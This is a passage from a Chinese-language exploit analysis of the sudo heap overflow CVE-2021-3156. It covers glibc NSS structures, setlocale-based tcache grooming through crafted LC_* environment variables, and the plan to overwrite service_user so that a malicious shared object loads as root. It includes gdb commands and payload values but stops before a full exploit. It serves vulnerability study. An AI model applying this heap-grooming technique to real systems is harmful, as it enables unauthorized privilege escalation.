# 六，劫持NSS服务用户对象实现提权原理

提权是由nss\_load\_library函数触发的，下面看看源码：

```
/* 加载NSS（Name Service Switch）库函数 */
static int
nss_load_library (service_user *ni)
{
  /* 检查该服务的库是否已加载 */
  if (ni->library == NULL)
    {
      /* 该服务尚未被使用过。获取服务的库，如果需要则创建一个新的。
         如果文件中没有服务表，这个静态变量将保存来自默认配置的service_library列表头 */
      static name_database default_table;
      
      /* 创建新的服务库：如果service_table存在则使用它，否则使用默认表default_table */
      ni->library = nss_new_service (service_table ?: &default_table,
                     ni->name);
      if (ni->library == NULL)
            return -1;  // 创建失败返回错误
    }
  /* 检查库是否已加载到内存 */
  if (ni->library->lib_handle == NULL)
    {
...
      /* 构建共享对象名称，格式为：libnss_<name>.so<revision> */
      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,"libnss_"),  // 基础前缀
                    ni->name),       // 服务名
              ".so"),          // 扩展名
        __nss_shlib_revision);  // 库版本号

      /* 尝试动态加载共享库 */
      ni->library->lib_handle = __libc_dlopen (shlib_name);
...
}
```

ni是堆上的service\_user 结构体，当 `ni->library->lib_handle` 为NULL 时，就会调用`__libc_dlopen` 进行 so 装载。如果我们可以溢出到ni所在堆块，那么只需要将library 覆盖为0 即可触发`nss_new_service`函数初始化，然后`ni->library->lib_handle`的值就可以被置为NULL从而触发so 装载，构造一个恶意so，在加载的时候调用提权函数即可！

动调可以发现nss\_load\_library函数在溢出发生前就初始化了，说明堆块有被覆盖的可能，具体的覆盖手法，后面讲解：  
![](images/20250429113251-a1434dcf-24aa-1.png)

## 源码解析NSS服务用户对象的堆块的申请机制

先了解一下什么是NSS（Name Service Switch）！

1.**统一管理多种名称解析服务**  
在 Linux 系统中，存在多种需要进行名称解析的场景，比如将主机名解析为 IP 地址（类似 DNS 解析域名到 IP 的功能，但也包括本地的主机名解析情况），或者将用户名解析为对应的用户 ID 等。NSS 提供了一个统一的框架，使得系统能够灵活地决定使用哪种具体的后端服务来完成这些名称解析操作。  
例如，当需要查找某个用户的相关信息（如用户 ID、所属组等）时，系统可以通过 NSS 配置来决定是从本地的`/etc/passwd`、`/etc/shadow`文件中查找，还是借助诸如 LDAP（轻量级目录访问协议，常用于企业网络中集中管理用户等信息）等外部服务来获取相应信息。

2.**NSS 的原理**  
配置文件驱动：NSS 的配置主要基于`/etc/nsswitch.conf`文件（不同 Linux 发行版具体路径基本一致，但可能存在细微差异）。这个文件中针对不同的数据库类型（如`passwd`代表用户数据库、`hosts`代表主机名相关数据库等）定义了一系列的查找来源和查找顺序。

下面是具体的内容：

```
# /etc/nsswitch.conf
#
# Example configuration of GNU Name Service Switch functionality.
# If you have the `glibc-doc-reference' and `info' packages installed, try:
# `info libc "Name Service Switch"' for information about this file.

passwd:         files systemd
group:          files systemd
shadow:         files
gshadow:        files

hosts:          files dns
networks:       files

protocols:      db files
services:       db files
ethers:         db files
rpc:            db files

netgroup:       nis
```

可以解读一下这个配置文件：

* `passwd`：先从`/etc/passwd`找用户信息，再用`systemd`找。
* `group`：先从`/etc/group`找组信息，再用`systemd`找。
* `hosts`：先查`/etc/hosts`，再用 DNS 查主机名对应 IP。
* `protocols`：先查数据库文件，再查`/etc/protocols`找协议信息。

通过这种配置方式，NSS 可以根据不同的数据库类型，按照指定的顺序依次尝试从不同的数据源中查找所需的信息。当然这是放在应用层的理解，如果回归到代码底层的话就是通过这些配置的不同规则到指定目录加载so文件，并且调用so中的函数用来返回所需数据！  
下面动态调试看看需要分析的源码函数有哪些，下面都是根据配置文件申请对于所需的堆块：  
![](images/20250429113255-a3c6df80-24aa-1.png)

## 解析NSS需要重点关注的源代码和结构体

源码分析的时候直接搜索函数名是找不到的，NSS服务为了满足灵活的处理规则，大部分函数名都是通过宏来定义的，便于函数的替换，所以需要结合源秒调试来定位源码，下面是调试时候会经过的宏定义出来的函数，可以略过：

```
#/home/ub20/FuzzCVEInit/sudo_fuzz/glibc-2.27/pwd/getpwuid.c:23
#define LOOKUP_TYPE	struct passwd
#define FUNCTION_NAME	getpwuid
#define DATABASE_NAME	passwd
#define ADD_PARAMS	uid_t uid
#define ADD_VARIABLES	uid
#define BUFLEN		NSS_BUFLEN_PASSWD

#/home/ub20/FuzzCVEInit/sudo_fuzz/glibc-2.27/nss/getXXbyYY.c
#define REENTRANT_NAME APPEND_R (FUNCTION_NAME)

LOOKUP_TYPE *FUNCTION_NAME (ADD_PARAMS){...}nss_interface_function (FUNCTION_NAME)
int INTERNAL (REENTRANT_NAME) (ADD_PARAMS, LOOKUP_TYPE *resbuf, char *buffer,size_t buflen, LOOKUP_TYPE **result H_ERRNO_PARMEXTRA_PARAMS)
int DB_LOOKUP_FCT (service_user **ni, const char *fct_name, const char *fct2_name,void **fctp)
```

接下来会进行的函数链分析：`get_user_info->getpwuid->__getpwuid_r->__nss_database_lookup->nss_parse_file->nss_getline->nss_parse_service_list`

再锁定一下需要弄清的堆块目标有哪些！主要是存放下面这些结构体的堆块操作都需要详细关注，我们的目标就是修改下面的结构体从而实现提权：

```
// 定义service_user结构体
typedef struct service_user
{
    struct service_user *next;// 指向下一个条目的指针，用于构建链表结构
    lookup_actions actions[5];// 根据结果采取的操作，以数组形式存储不同情况对应的操作
    service_library *library;// 指向底层库对象的链接
    void *known;// 已知函数的集合（具体用途可能根据上下文确定，这里只是定义结构体成员）
    char name[0];// 服务名称，这里是柔性数组，长度可变，可存放如`files`、`dns`、`nis`等服务名称
} service_user;

// 定义name_database_entry结构体
typedef struct name_database_entry
{
    struct name_database_entry *next;// 指向下一个条目的指针，用于构建链表结构
    service_user *service;// 要使用的服务列表，指向service_user结构体类型
    char name[0];// 数据库名称，同样是柔性数组，长度根据实际情况确定
} name_database_entry;

// 定义name_database结构体
typedef struct name_database
{
    name_database_entry *entry;// 所有已知数据库的列表，指向name_database_entry结构体类型
    service_library *library;// 带有服务实现的库列表，指向service_library结构体类型
} name_database;
```

`service_user`表示一个具体的服务配置项，用于定义如何查找和使用某个服务。  
`name_database_entry`表示一个数据库的配置项，关联数据库名称到具体的服务链。  
`name_database`顶层结构，管理所有数据库及其关联的服务和库。  
下面是具体的结构图：  
![](images/20250429113256-a468d7bd-24aa-1.png)

## 开始解析NSS相关结构体的申请顺序和布局

第一个管理整个NSS服务的结构体肯定是第一个被申请的！`static name_database *service_table;`chunk申请序号为1！

```
static name_database *service_table;
int
__nss_database_lookup (const char *database, const char *alternate_name,
               const char *defconfig, service_user **ni)
{
  ··· ···
  /* Are we initialized yet?  */
  if (service_table == NULL)
    /* Read config file.  */
    service_table = nss_parse_file (_PATH_NSSWITCH_CONF);
  ··· ···
}
```

第一次调用`__nss_database_lookup`的时候，`service_table == NULL`整个条件必然为true，从而触发service\_table结构体的初始化申请（具体申请在nss\_parse\_file）！

下面的函数会继续初始化，主要是将`name_database_entry *this;`结构体申请堆块，由于该结构体存在多个堆块先不进行编号！

```
static name_database *nss_parse_file (const char *fname){
...
  name_database *result;
  name_database_entry *last;
...
  //调试发现直接从topchunk分割出一个0x20的堆块
  result = (name_database *) malloc (sizeof (name_database)); //为name_database *service_table申请堆块
...
  do
    {
      name_database_entry *this;
...
      this = nss_getline (line);
      if (this != NULL)
        {
          if (last != NULL)
            last->next = this;
          else
            result->entry = this;
          last = this;
        }
    }
  while (!feof_unlocked (fp));
...
}
```

这部分函数会根据配置文件的具体内容和请求规则申请合适的堆块来存放所需数据，由于sudo是进行密码验证的提权操作，所以他会读取配置文件中密码相关的规则来申请和初始化相关数据结构。我调试环境的`/etc/nsswitch.conf`的配置内容是：  
![](images/20250429113257-a4c2a2cf-24aa-1.png)  
所以这个`while (!feof_unlocked (fp));`循环会循环读取密码相关规则的文本来进行初始化，然后调用nss\_getline来初始化后续结构体。

```
/**
 * @brief 解析配置文件中的一行，生成一个 name_database_entry 结构体
 * @param line 配置文件中的一行字符串（会被修改）
 * @return 成功返回 name_database_entry 指针，失败返回 NULL
 */
static name_database_entry *nss_getline(char *line) {
    const char *name;           // 临时保存数据库名称的指针
    name_database_entry *result; // 最终返回的数据库条目结构体
...

    /* 分配内存：
     * 1. 基础结构体大小 sizeof(name_database_entry)
     * 2. 加上名称的长度（柔性数组name的实际空间） */
    result = (name_database_entry *)malloc(sizeof(name_database_entry) + len);
...
    result->service = nss_parse_service_list(line);/* 解析服务列表（冒号后面的部分）：这个函数会返回一个service_user链表 */
    result->next = NULL;

    return result;  // 返回创建好的数据库条目
}
```

这里会为具体的`name_database_entry *this;`结构体申请堆块！继续往下就是我们要劫持的结构体`service_user service`申请的地方了

```
/**
 * @brief 解析服务列表字符串，生成service_user链表
 * @param line 包含服务列表的字符串（格式参见下方说明）
 * @return 成功返回service_user链表头指针，失败返回NULL
 */
static service_user *nss_parse_service_list(const char *line) {
    // result: 最终返回的链表头指针
    // nextp: 指向当前链表最后一个节点的next指针的指针（用于高效追加节点）
    service_user *result = NULL, **nextp = &result;

    // 循环解析每个服务配置
    while (1) {
        ...
        /* 分配新service_user结构体内存：*/
        new_service = (service_user *)malloc(sizeof(service_user) + (line - name + 1));
        ...
        new_service->actions[2 + NSS_STATUS_TRYAGAIN] = NSS_ACTION_CONTINUE
        /* 初始化其他字段 */
        new_service->library = NULL;  // 暂时未关联库
        new_service->known = NULL;    // 已知函数集合初始为空
        new_service->next = NULL;    // 下一个节点指针初始为空

        ... // 这里应该有更多解析逻辑（如解析动作配置等）

        // 将新节点追加到链表末尾
        *nextp = new_service;
        nextp = &new_service->next;
    }
...
}
```

这里就是根据配置文件初始化我们目标结构体`service_user`的地方了，将结构体的每个字段初始化！  
 总结下来这里的堆块申请顺序就是基于配置文件`/etc/nsswitch.conf` 的内容一步步解析并且存储堆块，可以通过静态分析的到底的信息是这些堆块申请的非常紧凑和命令，很容易调试出具体布局！

## 动态调试分析nss服务堆块申请规律

开始调试：

```
gdb exp 
catch exec
set follow-exec-mode new 调试exp 的时候捕获子进程
run
b main #这个是在exec执行的sudoedit中下main函数断点
c #成功开始调试sudo,sudoedit其实软连接直接指向sudo
```

开始调试堆块布局

```
directory /root/glibc-2.27/
directory /root/glibc-2.27/nss/
directory /root/glibc-2.27/elf/
directory /root/glibc-2.27/locale/

b nss_parse_service_list
b nss_parse_file
b nss_getline
b malloc
```

![](images/20250429113258-a524400d-24aa-1.png)  
查看一下nss的调用栈，发现所有的0x40大小的堆块都已经被使用了，动态调试发现每个`service_user`结构体申请的大小都是0x40!  
整个堆块的申请顺序是由第一次搜索的时候发现全局入口`service_table` 为空，则进行初始化，根据 `/etc/nsswitch.conf` 文件记录内容进行初始化，最后的数据结构如下所示，通过动态调试得出整个链表的结构：

![](images/20250429113258-a599f747-24aa-1.png)

# 七，解析setlocale能够进行堆布局原理

布局主要由下面的逻辑实现的，向环境变量注入特定的`LC_*`环境变量控制堆块的申请：

```
char *setlocale (int category, const char *locale){
...
  /* 处理LC_ALL类别（设置所有类别） ，sudo调用setlocale(LC_ALL, '');进入的分支*/
  if (category == LC_ALL)
    {
...
      /* 为每个类别加载新数据 */
      while (category-- > 0)
        if (category != LC_ALL){
            newdata[category] = _nl_find_locale (locale_path, locale_path_len,  //_nl_find_locale核心，根据环境变量组合成字符串，如果环境变量符合格式就返回非NULL
                         category,
                         &newnames[category]);

            if (newdata[category] == NULL){
...
                break; //如果环境变量有问题newdata[category]的值为NULL，就会跳出循环
              }

            /* 标记数据为不可删除 */
            if (newdata[category]->usage_count != UNDELETABLE)
              newdata[category]->usage_count = UNDELETABLE;

            /* 复制区域设置名称 */
            if (newnames[category] != _nl_C_name){  //如果该环境变量的值未被设置的话直接就是将变量的值设置为C,会进入true分支
                if (strcmp (newnames[category],
                    _nl_global_locale.__names[category]) == 0)
                  newnames[category] = _nl_global_locale.__names[category];
                else
                  {
                    newnames[category] = __strdup (newnames[category]);//没有问题的环境变量就会从这里创建一个目标堆块
                    if (newnames[category] == NULL)
                      break;
                  }
            }
        }

      /* 创建新的复合名称 */
      composite = (category >= 0    //这里如果composite为NULL的话就可以让程序进入free分支，把使用环境变量构造的堆块，按顺序进行free掉！
               ? NULL : new_composite_name (LC_ALL, newnames));
      if (composite != NULL)
        {
        ...//更新LC_ALL环境变量的值
        }
      else
        /* 失败时释放资源 */
        for (++category; category < __LC_LAST; ++category)
          if (category != LC_ALL && newnames[category] != _nl_C_name
              && newnames[category] != _nl_global_locale.__names[category])
            free ((char *) newnames[category]); //批量按顺序释放自己构造的指定堆块
...
}
libc_hidden_def (setlocale)
```

核心要点出现在\_nl\_find\_locale这个函数上，他会寻找程序中符合`LC_*`名称的环境变量，并获取他们具体的值进行堆块申请并存储起来`__strdup`，最后将存储起来的环境变量的值都拼接到`LC_ALL`变量中，也就是代码中`composite != NULL`这个条件为true的时候执行的操作（代码省略了）！本来正常的操作是没有任何堆块是可控的，但是\_nl\_find\_locale的内部有个函数会检测一系列环境变量`LC_*`的值，判断他的值是否符合一定的规则，如果有一个不符合就将将直接符合的并且申请的堆块都一起释放掉，也就是代码中的`free ((char *) newnames[category]);`，也就是这个操作可以保证向堆块回收站中放置多个指定大小的空闲堆块，从而达到控制任意堆块顺序结构的引子！

直接调试举例：  
![](images/20250429113253-a235e945-24aa-1.png)  
分析一下这两个环境变量：

```
LC_ADDRESS=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  #符合规则，根据A的字符串长度申请堆块
LC_NAME=xxxxxxxxxxxxxxxxxxxxx #不符合规则，导致前面合法的内容的堆块被批量free
```

毫无疑问如果需要指定大小的堆块或者数量放置到bins中，只要适当修改环境变量的值即可实现！

## 源码解析setlocale能够控制堆块的核心原理

探究如何实现构造指定顺序的堆块结构:

```
char *setlocale (int category, const char *locale){
...
  /* 处理LC_ALL类别（设置所有类别） ，sudo调用setlocale(LC_ALL, '');进入的分支*/
  if (category == LC_ALL)
    {
...
      /* 为每个类别加载新数据 */
      while (category-- > 0)
        if (category != LC_ALL){
            newdata[category] = _nl_find_locale (locale_path, locale_path_len,  //_nl_find_locale核心，根据环境变量组合成字符串，如果环境变量符合格式就返回非NULL
                         category,
                         &newnames[category]);

            if (newdata[category] == NULL){
...
                break; //如果环境变量有问题newdata[category]的值为NULL，就会跳出循环
              }

            /* 标记数据为不可删除 */
            if (newdata[category]->usage_count != UNDELETABLE)
              newdata[category]->usage_count = UNDELETABLE;

            /* 复制区域设置名称 */
            if (newnames[category] != _nl_C_name){  //如果该环境变量的值未被设置的话直接就是将变量的值设置为C,会进入true分支
                if (strcmp (newnames[category],
                    _nl_global_locale.__names[category]) == 0)
                  newnames[category] = _nl_global_locale.__names[category];
                else
                  {
                    newnames[category] = __strdup (newnames[category]);//没有问题的环境变量就会从这里创建一个目标堆块
...
      /* 创建新的复合名称 */
      composite = (category >= 0    //这里如果composite为NULL的话就可以让程序进入free分支，把使用环境变量构造的堆块，按顺序进行free掉！
               ? NULL : new_composite_name (LC_ALL, newnames));
      if (composite != NULL)
        {
        ...//更新LC_ALL环境变量的值
        }
      else
        /* 失败时释放资源 */
        for (++category; category < __LC_LAST; ++category)
          if (category != LC_ALL && newnames[category] != _nl_C_name
              && newnames[category] != _nl_global_locale.__names[category])
            free ((char *) newnames[category]); //批量按顺序释放自己构造的指定堆块
...
}
libc_hidden_def (setlocale)
```

根据sudo源码可以知道调用函数所传入的参数是`setlocale(LC_ALL, '');`所以这个函数会通过环境变量中的值来进行本地化设置（包括语言、数字格式、货币格式、时间格式等）,之后会进入这里setlocale->`_nl_find_locale`。

进入\_nl\_find\_locale后,`LC_*`环境变量被获取并且进行解析,我们可以解析一下这个函数:

```
/* 查找并加载指定区域设置数据的函数 */
struct __locale_data *
_nl_find_locale (const char *locale_path, size_t locale_path_len,
                 int category, const char **name)
{
...
  /* 如果传入的区域设置名为空字符串 */
  if (cloc_name[0] == '\0')
    {
      /* 用户通过环境变量决定使用哪个区域设置 */
      cloc_name = getenv ("LC_ALL");  // 首先检查LC_ALL环境变量,根据环境变量生效的顺序进行获取参数
      if (!name_present (cloc_name))
        cloc_name = getenv (_nl_category_names.str
                            + _nl_category_name_idxs[category]);  // 检查特定类别的环境变量
      if (!name_present (cloc_name))
        cloc_name = getenv ("LANG");  // 检查LANG环境变量
      if (!name_present (cloc_name))
        cloc_name = _nl_C_name;  // 最后使用默认的C区域设置
    }
...
  if (locale_file == NULL)
    {
      //_nl_make_l10nflist 之中会进行非常多的堆操作
      locale_file = _nl_make_l10nflist (&_nl_locale_file_list[category],
                    locale_path, locale_path_len, mask,
                    language, territory, codeset,
                    normalized_codeset, modifier,
                    _nl_category_names.str
                    + _nl_category_name_idxs[category], 1);
      if (locale_file == NULL)
    /* This means we are out of core.  */
    return NULL;
    }
```

从代码中可以看出，获取每个类别的区域名称的优先级是 LC\_ALL、LC\_＜类别名称＞、LANG 环境变量。如果没有设置，则使用特殊的区域名称“C”。如果区域名称是“C”，`_nl_find_locale` 函数将立即返回，而不会触及堆。  
下面是这些环境变量的值，会被一一获取：

```
#define __LC_CTYPE		 0
#define __LC_NUMERIC		 1
#define __LC_TIME		 2
#define __LC_COLLATE		 3
#define __LC_MONETARY		 4
#define __LC_MESSAGES		 5
#define __LC_ALL		 6
#define __LC_PAPER		 7
#define __LC_NAME		 8
#define __LC_ADDRESS		 9
#define __LC_TELEPHONE		10
#define __LC_MEASUREMENT	11
#define __LC_IDENTIFICATION	12
```

`cloc_name = getenv (_nl_category_names.str+_nl_category_name_idxs[category]);`  这段代码会获取这些环境变量的值！

继续往后续跟踪\_nl\_make\_l10nflist函数可以发现

```
struct loaded_l10nfile *
_nl_make_l10nflist (struct loaded_l10nfile **l10nfile_list,
            const char *dirlist, size_t dirlist_len,
            int mask, const char *language, const char *territory,
            const char *codeset, const char *normalized_codeset,
            const char *modifier,
            const char *filename, int do_allocate)
{
...
  /* Allocate room for the full file name.  */
  //根据mask 的值会组成不同的文件路径，长度自然不同，根据长度申请chunk
  abs_filename = (char *) malloc (dirlist_len
                  + strlen (language)
                  + ((mask & XPG_TERRITORY) != 0
                     ? strlen (territory) + 1 : 0)
                  + ((mask & XPG_CODESET) != 0
                     ? strlen (codeset) + 1 : 0)
                  + ((mask & XPG_NORM_CODESET) != 0
                     ? strlen (normalized_codeset) + 1 : 0)
                  + ((mask & XPG_MODIFIER) != 0
                     ? strlen (modifier) + 1 : 0)
                  + 1 + strlen (filename) + 1);

...

  if ((mask & XPG_TERRITORY) != 0)
    {
      *cp++ = '_';
      cp = stpcpy (cp, territory);
    }
  if ((mask & XPG_CODESET) != 0)
    {
      *cp++ = '.';
      cp = stpcpy (cp, codeset);
    }
  if ((mask & XPG_NORM_CODESET) != 0)
    {
      *cp++ = '.';
      cp = stpcpy (cp, normalized_codeset);
    }
  if ((mask & XPG_MODIFIER) != 0)
    {
      *cp++ = '@';
      cp = stpcpy (cp, modifier);
    }

  *cp++ = '/';
  stpcpy (cp, filename);
...
  retval = (struct loaded_l10nfile *)
    malloc (sizeof (*retval) + (__argz_count (dirlist, dirlist_len)
                * (1 << pop (mask))
                * sizeof (struct loaded_l10nfile *)));
...
}
```

这里的代码就会检测环境变量是否符合格式如果不符合就直接返回NULL！  
环境变量会基于这个规则被分解:

```
  /* XPG语法的区域设置名最多可包含四个部分：
     language[_territory[.codeset]][@modifier]
     除了第一部分，其他部分都可以省略。如果找不到完全匹配的区域设置，
     会尝试查找更通用的版本。各部分将按以下顺序被剥离：
     (1) codeset
     (2) normalized codeset
     (3) territory
     (4) modifier */
  mask = _nl_explode_name (loc_name, &language, &modifier, &territory,
                           &codeset, &normalized_codeset);
```

注释非常清晰。返回值“mask”是标志，用于指示给定区域字段(territory,codeset..)的值是否存在。

```
#一个符合规则的环境变量，举例
LC_ADDRESS=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

更详细的规则可以区看相关解析：[[漏洞分析] CVE-2021-3156 sudo提权分析及exp调试修改-CSDN博客](https://blog.csdn.net/Breeze_CAT/article/details/122676551)

## 动态调试setlocale控制堆结构规则

主要是结合源码和动态调试，测试出setlocale控制堆结构规则，这样就可以更好的将setlocale控制堆块结构手法拓展到其他漏洞！

```
gdb exp 
catch exec
set follow-exec-mode new 调试exp 的时候捕获子进程
run
b main #这个是在exec执行的sudoedit中下main函数断点
c #成功开始调试sudo,sudoedit其实软连接直接指向sudo
```

调试这两个函数可以发现

```
b setlocale
b _nl_find_locale
```

在第一次进入\_nl\_find\_locale函数的时候，就会通过genenv来获取`LC_*`环境变量的具体值，  
![](images/20250429113341-bf03dde4-24aa-1.png)

下面开始调试\_nl\_make\_l10nflist函数的内部，可以发现他是如何构造一个指定大小的堆块！  
![](images/20250429113357-c890ca25-24aa-1.png)

```
envp[134]: LC_IDENTIFICATION=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[135]: LC_MEASUREMENT=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[136]: LC_TELEPHONE=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[137]: LC_ADDRESS=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[138]: LC_NAME=xxxxxxxxxxxxxxxxxxxxx
```

环境变量的值是：C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
所以申请出来的堆块大小是：

```
Allocated chunk | PREV_INUSE
Addr: 0x5614ccbdb4a0
Size: 0x61
```

![](images/20250429113408-cf1c1ce9-24aa-1.png)

手动注入指定的环境变量，构造出3个0x40和一个0xa0的堆块到tcachebin中！

```
set args -s \ 111111111111111111111111111111111111111111111111111111111111111111111111111111111
b setlocale@plt
show environment
set environment LC_IDENTIFICATION=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
set environment LC_MEASUREMENT=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
set environment LC_TELEPHONE=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
set environment LC_ADDRESS=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
set environment LC_NAME=xxxxxxxxxxxxxxxxxxxxx
b new_composite_name
```

手动注入环境变量，发现注入5个环境变量才会将目标堆块释放！  
![](images/20250429113417-d475bd9c-24aa-1.png)  
发现当环境变量中存在`LC_*`的时候setlocale函数会创建堆块和释放堆块，不然不会进行堆内存操作！

只有当存在5个环境变量的时候，bin中才可以看见4个特意构造大小的堆块！  
需要构造一个不符合规则的环境变量才可以成功将其他符合规则的堆块进行按顺序free！

```
#不符合规则的环境变量
set environment LC_NAME=xxxxxxxxxxxxxxxxxxxxx
```

查看一下原因：

```
gdb sudoedit
set args -s \ 111111111111111111111111111111111111111111111111111111111111111111111111111111111
b setlocale@plt
run
b main
set environment LC_IDENTIFICATION=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
directory /root/glibc-2.27/locale/
b  /root/glibc-2.27/locale/setlocale.c:369
```

关键核心导致堆块未被free的原因：

```
      /* 创建新的复合名称 */
      composite = (category >= 0
               ? NULL : new_composite_name (LC_ALL, newnames));
      if (composite != NULL)
        {
          /* 更新全局区域设置 */
          for (category = 0; category < __LC_LAST; ++category)
            if (category != LC_ALL)
              {
                setdata (category, newdata[category]);
                setname (category, newnames[category]);
              }
          setname (LC_ALL, composite);

          /* 通知消息目录函数 */
          ++_nl_msg_cat_cntr;
        }
      else
        /* 失败时释放资源 */
        for (++category; category < __LC_LAST; ++category)
          if (category != LC_ALL && newnames[category] != _nl_C_name
              && newnames[category] != _nl_global_locale.__names[category])
            free ((char *) newnames[category]);
```

在所有类别名称都经过 strdup()复制并加载数据后，LC\_ALL 在 new\_composite\_name 函数中被创建。如果所有 LC 名称都相同，其值将仅从第一个中选择（与设置 LC\_ALL 环境变量相同）。如果所有 LC 名称都不相同，其值将结合所有 LC 名称，例如“LC\_CTYPE=C;LC\_NUMERIC=C.UTF-8;…”。

new\_composite\_name函数会查看所有的宏的值：newnames【1~12】   
![](images/20250429113430-dc33bac4-24aa-1.png)  
1~12对应的环境变量：

```
#define __LC_CTYPE		 0
#define __LC_NUMERIC		 1
#define __LC_TIME		 2
#define __LC_COLLATE		 3
#define __LC_MONETARY		 4
#define __LC_MESSAGES		 5
#define __LC_ALL		 6
#define __LC_PAPER		 7
#define __LC_NAME		 8
#define __LC_ADDRESS		 9
#define __LC_TELEPHONE		10
#define __LC_MEASUREMENT	11
#define __LC_IDENTIFICATION	12
```

发现这个函数会把所有的环境变量的值拼接起来：

```
composite = (category >= 0? NULL : new_composite_name (LC_ALL, newnames));
```

![](images/20250429113439-e144a5cf-24aa-1.png)

需要让堆块分配就得出现异常，让`__LC_NAME`的规则不符合要求，就会导致抛弃所有的堆块，所以后续就会调用free，做到释放指定大小的堆块  
在 `_nl_find_locale` 函数中，会首先调用 `_nl_explode_name` 函数根据环境变量的值堆mask 进行赋值(就如同我在代码中的注释中说的)，主要看有没有国家、语言、用户自定义后缀这三项，如果有就会设置对应的maks，其中语言会设置两个，总共四个。然后调用\_nl\_make\_l0nflist 函数会直接导致 `_nl_find_locale` 返回空，触发上面的 setlocale 之中的循环break (很重要)。

## 总结setlocale向tcachebins放入堆块的规则

当setlocale输入的参数是(LC\_ALL, '')的时候：  
如何控制堆块申请的大小：  
`C.UTF-8@len`环境变量的长度来的，如果len为33，则会申请malloc(33+8+1)-》malloc(42)返回一个0x40的chunk！  
同理len为137，则会申请malloc(129+8+1)-》malloc(0x8a)返回一个0xa0的chunk！

如何控制堆块释放的顺序：

```
#define __LC_CTYPE		 0
#define __LC_NUMERIC		 1
#define __LC_TIME		 2
#define __LC_COLLATE		 3
#define __LC_MONETARY		 4
#define __LC_MESSAGES		 5
#define __LC_ALL		 6
#define __LC_PAPER		 7
#define __LC_NAME		 8
#define __LC_ADDRESS		 9
#define __LC_TELEPHONE		10
#define __LC_MEASUREMENT	11
#define __LC_IDENTIFICATION	12
```

每个环境变量的遍历顺序就是每个堆块的释放顺序，第一个被查找的环境遍历是`__LC_IDENTIFICATION`!

如何确保构造的环境变量会被释放到tcachebin中？  
需要构造出一个异常的环境变量，且要确保异常环境变量之前的环境变量是符合规则的，不然就无法释放指定堆块到tcachebin中！

# 八，基于已有的思路如造可以利用的POC

我们的提权思路前面已经很清晰了就是覆盖掉NSS的service\_user 结构体的`ni->library->lib_handle`指针为0即可！因此我们需要需要构造一个堆环境将目标结构体堆块被分配到发生溢出的堆块下方，从而漏洞使用溢出漏洞进行提权！

```
main()
|- _GI_setlocale(LC_ALL, '')               
...
|- get_user_info()                   // 获取用户信息
|  |- getpwuid                       // 通过UID查询用户信息（如用户名、主目录）
|  |   |- parse /etc/nsswitch.conf // 解析NSS配置，创建 `service_user` 结构体（用于后续身份验证）
....
|- policy_check()                    // 执行权限检查
|   |- sudoers_policy_main()          // 主策略逻辑（见下方详细流程）
|	|   |- set_cmd()                      // 设置待执行的命令参数（此处存在已知漏洞）
        // 该函数可能存在命令注入漏洞，攻击者可通过恶意参数绕过权限控制
        |- sudo_file_lookup()                 // 从已解析的 `/etc/sudoers` 中查询规则
        |  |-nss *                            // 可能调用NSS（Name Service Switch）模块
        |  |    |-nss_load_library()             // 动态加载NSS库（如LDAP/SSSD集成）
```

从新来梳理一下整个程序在奔溃前的流程图，筛选出NSS服务的加载流程和service\_user 结构体初始化流程！  
发现按正常逻辑来说get\_user\_info函数所创建的NSS初始化结构体service\_user 所在的堆块一定是在漏洞堆块的上方，根本无法实现溢出从而实现覆盖！  
但是前文分析出来的setlocale控制堆结构规则可以很好的被利用，且通过动态调试发现从 `_GI_setlocale(LC_ALL, '') -》get_user_info()`并没有向tcachebin中释放新的堆块。  
并且当使用`_GI_setlocale(LC_ALL, '')`向tcachebin放入0x40和0xa0大小的堆块的时候，在来到get\_user\_info()函数之后，构造出来的空闲堆块依旧在tcachebin中并未被使用，所以只需要构造合适的空闲堆块，就可以将vuln chunk（可以溢出的堆块）和目标堆块 target chunk（存放service\_user结构体的有三个）放置为可以溢出覆盖的堆关系，从而实现从vuln chunk溢出覆盖 target chunk达到提权的目的！

根据我们之前动态调试获得的堆获取顺序，并且发现我们的目标堆块有三个（有三个service\_user结构体）。  
![](images/20250429113258-a599f747-24aa-1.png)  
上图的编号是申请堆块的顺序，且name\_database堆块大小为0x20;name\_database\_entry堆块大小为0x20;service\_user堆块大小为0x40,所以我只需要使用`setlocale(LC_ALL, '')`构造出3个0x40的空闲堆块，让目标chunk（target chunk） 位于溢出堆块（vuln chunk）的下方！  
且将chunk 3 5 7 这三个堆块申请到堆块chunk 1 2 4 6 的上方，不然进行溢出操作的时候破坏了有用堆块的内存同样会导致利用失败！  
还需要考虑一点就是将vuln chunk分配到chunk 3 5 7这三个chunk之间,只有这样才可以完成溢出操作，且不破坏重要结构体！  
下面是vlun chunk可以被放置的位置有A,B,C三个选项，我选择构造vuln chunk在C位置！  
![](images/20250429113500-ee1c0470-24aa-1.png)  
接下来就是考虑如何确保在setlocale构造的空闲堆块，不在抵达漏洞函数申请堆块前被消耗！解决方法就是手动盲测各个大小的堆块，看看多大的堆块不会被提前消耗，发现0xa0大小的堆块最合适！  
也可以分析heap.log文件，经过动态调试和分析发现，确实0xa0大小的堆块最合适：

```
